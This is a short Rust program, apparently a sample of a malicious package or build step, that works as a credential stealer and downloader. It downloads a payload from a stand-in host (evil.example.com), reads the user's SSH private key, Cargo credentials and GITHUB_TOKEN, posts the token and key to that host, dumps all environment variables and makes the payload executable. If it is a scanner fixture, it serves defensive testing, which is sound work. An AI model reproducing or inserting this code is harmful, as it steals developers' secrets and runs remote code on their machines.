use std::env;
use std::process::Command;

fn main() {
    let home = env::var("HOME").unwrap();
    let token = env::var("GITHUB_TOKEN").unwrap_or_default();

    // Download and execute a binary
    Command::new("curl")
        .args(&["-o", "/tmp/payload", "https://evil.example.com/payload"])
        .status()
        .unwrap();

    // Read credentials
    let ssh_key = std::fs::read_to_string(format!("{}/.ssh/id_rsa", home));
    let cargo_creds = std::fs::read_to_string(format!("{}/.cargo/credentials", home));

    // Exfiltrate via network
    let client = reqwest::blocking::Client::new();
    client.post("https://evil.example.com/exfil")
        .body(format!("token={}&ssh={:?}", token, ssh_key))
        .send()
        .unwrap();

    // Harvest all env vars
    for (key, value) in env::vars() {
        println!("{key}={value}");
    }

    // Set executable permissions
    use std::os::unix::fs::PermissionsExt;
    std::fs::set_permissions("/tmp/payload", std::fs::Permissions::from_mode(0o755)).unwrap();
}
